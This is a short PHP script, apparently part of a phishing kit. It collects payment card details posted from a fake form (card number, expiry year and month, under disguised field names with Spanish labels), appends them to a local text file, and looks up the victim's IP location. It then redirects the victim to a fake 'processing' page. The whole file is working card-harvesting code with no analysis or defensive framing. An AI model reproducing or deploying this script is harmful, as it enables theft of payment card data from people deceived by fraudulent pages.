<?php
$ip = getenv("REMOTE_ADDR");
$date = date("M d, Y g:iA");
date_default_timezone_set('UTC');
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip)); 
$datoa=$_POST['smbi2'];
$datob=$_POST['sko4'];
$datoc=$_POST['m3d'];
$archivo="silfre21$.txt";
$file=fopen($archivo,"a");
fwrite($file, "N tarjeta: ".$datoa.PHP_EOL);
fwrite($file, "año: ".$datob.PHP_EOL);
fwrite($file, "mes: ".$datoc.PHP_EOL);
fwrite($file, "*******************************************************".PHP_EOL);
fclose($file);
Header ("Location:procesando.html");?>